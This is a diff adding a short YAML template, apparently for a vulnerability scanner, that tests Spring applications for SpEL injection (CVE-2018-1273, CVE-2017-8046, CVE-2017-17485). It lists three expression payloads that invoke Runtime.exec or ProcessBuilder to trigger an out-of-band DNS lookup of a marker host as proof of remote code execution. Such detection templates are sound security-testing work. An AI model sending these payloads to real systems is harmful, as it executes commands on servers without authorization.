@@ -1,0 +1,23 @@
+generate:
+  payload:
+    - T(java.lang.Runtime).getRuntime().exec("getent${IFS}DNS_MARKER")
+    - "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('getenv${IFS}DNS_MARKER')"
+    - new java.lang.ProcessBuilder({'nslookup DNS_MARKER'}).start()
+detect:
+  - oob:
+    - dns
+meta-info:
+  type: rce
+  threat: 95
+  tags:
+    - SpEL injection
+    - Spring
+    - Spring Framework
+    - Java
+    - RCE
+    - Remote Code Execution
+    - OWASP Top 10
+    - OWASP
+    - CVE-2018-1273
+    - CVE-2017-8046
+    - CVE-2017-17485
